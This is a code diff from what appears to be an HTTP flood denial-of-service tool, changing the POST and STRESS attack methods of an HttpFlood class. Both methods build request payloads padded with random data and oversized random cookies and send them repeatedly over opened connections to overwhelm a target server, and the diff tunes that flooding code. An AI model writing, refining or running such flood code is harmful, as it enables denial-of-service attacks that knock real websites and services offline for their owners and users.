@@ -317,22 +317,21 @@ class HttpFlood:
             else "REQUESTS"
 
     def POST(self) -> None:
-        payload: bytes = self.generate_payload((f"Content-Length: {32}\r\n"
+        payload: bytes = self.generate_payload((f"Content-Length: {44}\r\n"
                                                 "X-Requested-With: XMLHttpRequest\r\n"
-                                                "Content-Type: application/x-www-form-urlencoded; charset=utf-8\r\n\n"
-                                                f"data={ProxyTools.Random.rand_str(32)}\r\n"))
-
-        with self.open_connection() as s:
-            for _ in range(self._rpc):
-                s.send(payload)
+                                                "Content-Type: application/json\r\n\r\n"
+                                                '{"data": %s}'
+                                                ) % ProxyTools.Random.rand_str(32))[:-2]
+        try:
+            with self.open_connection() as s:
+                for _ in range(self._rpc):
+                    s.send(payload)
+        except Exception:
+            s.close()
 
     def STRESS(self) -> None:
-        payload: bytes = self.generate_payload((f"Content-Length: {2048}\r\n"
-                                                "X-Requested-With: XMLHttpRequest\r\n"
-                                                "Content-Type: application/x-www-form-urlencoded; charset=utf-8\r\n\n"
-                                                f"data={ProxyTools.Random.rand_str(2048)}\r\n"
-                                                "Cookie: %s=%s" % (ProxyTools.Random.rand_str(12),
-                                                                   ProxyTools.Random.rand_str(100))))
+        payload: bytes = self.generate_payload((f"Cookie: %s=%s" % (ProxyTools.Random.rand_str(12),
+                                                                   ProxyTools.Random.rand_str(316))))
         try:
             with self.open_connection() as s:
                 for _ in range(self._rpc):
